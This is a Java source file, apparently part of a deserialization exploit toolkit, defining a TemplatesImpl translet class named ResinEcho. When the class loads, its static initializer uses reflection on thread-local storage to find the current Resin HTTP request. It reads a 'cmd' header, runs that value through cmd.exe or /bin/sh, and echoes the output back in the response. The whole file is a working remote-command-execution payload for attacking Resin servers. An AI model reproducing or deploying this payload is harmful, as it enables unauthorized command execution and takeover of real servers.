package com.sorry.utils.templatesimpl;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.PrintWriter;
import java.lang.reflect.Field;

/**
 * created by 0x22cb7139 on 2021/7/27
 * by java-object-search
 */
public class ResinEcho extends AbstractTranslet {
    static{
        try{
            Field f = Thread.currentThread().getClass().getDeclaredField("threadLocals");
            f.setAccessible(true);
            Object obj = f.get(Thread.currentThread());
            f  = obj.getClass().getDeclaredField("table");
            f.setAccessible(true);
            obj = f.get(obj);
            Object[] objArr = (Object[]) obj;
            for(int i = 0;i<objArr.length;i++){
                Object o = objArr[i];
                if(o==null) continue;
                f = o.getClass().getDeclaredField("value");
                f.setAccessible(true);
                obj = f.get(o);
                if(obj != null && obj.getClass().getName().equals("com.caucho.server.http.HttpRequest")) {
                    com.caucho.server.http.HttpRequest req = (com.caucho.server.http.HttpRequest) obj;
                    if(req.getHeader("cmd")!=null){
                        String cmd = req.getHeader("cmd");
                        PrintWriter writer = req.getResponse().getWriter();
                        if (cmd != null) {
                            String cc = "";
                            java.lang.ProcessBuilder p;
                            if(System.getProperty("os.name").toLowerCase().contains("win")){
                                p = new java.lang.ProcessBuilder("cmd.exe", "/c", cmd);
                            }else{
                                p = new java.lang.ProcessBuilder("/bin/sh", "-c", cmd);
                            }
                            java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter("\\A");
                            cc = c.hasNext() ? c.next(): cc;
                            c.close();
                            writer.write(cc);
                            writer.flush();
                            writer.close();
                        break;
                        }
                    }
                }
            }

        }catch (Exception e){
            e.printStackTrace();
        }
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
